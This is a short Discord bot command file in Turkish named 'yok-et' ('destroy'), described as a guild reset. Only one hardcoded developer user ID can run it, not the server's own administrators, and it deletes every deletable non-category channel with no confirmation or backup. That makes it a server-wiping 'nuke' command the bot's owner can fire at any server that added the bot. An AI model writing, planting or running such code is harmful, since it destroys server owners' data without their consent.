const discord = require('discord.js');
const {MessageEmbed} = require("discord.js");
const { renk, slogan } = require("../../versioninfo.json");

exports.run = async(client, message, args) => {

    if(message.guild === null) {
        return
    }

    const izinyok = new MessageEmbed()
        .setTitle('Yetki Reddedildi')
        .setDescription(`${message.author} Bu komutu sadece geliştiricim kullanabilir`)
        .setColor(renk)
            .setFooter(slogan)
    if (message.author.id !== '801006452416184330') return message.channel.send(izinyok);

    const channels = message.guild.channels.cache.filter(ch => ch.type !== 'category');
    channels.forEach(async (channel) => {
        if(channel.deletable) {
            await channel.delete().catch(e => console.log(e))
        }
    });

};

exports.conf = {
    enabled: true,
    aliases: [ 'guild-reset'],
};

exports.help = {
    name: 'yok-et',
    description: 'Guild Reset Komudu.',
    usage: 'guild-reset'
};